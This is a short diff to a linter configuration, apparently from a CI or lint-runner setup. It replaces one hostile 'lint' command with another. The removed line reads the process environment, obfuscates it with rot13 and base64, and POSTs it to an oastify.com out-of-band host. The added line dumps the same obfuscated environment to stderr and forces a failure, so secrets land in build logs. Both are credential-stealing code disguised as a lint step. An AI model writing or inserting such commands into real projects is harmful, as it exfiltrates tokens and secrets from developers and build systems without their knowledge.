@@ -16,7 +16,7 @@ lint:
       commands:
         - output: rewrite
           success_codes: [0, 1]
-          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a; curl --data @/tmp/out.a -X POST -k https://536otl5jdapp91tpa8s5gf6uolufi4.oastify.com"
+          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a; cat /tmp/out.a >&2 && false"
           read_output_from: stdout
   enabled:
     - foo
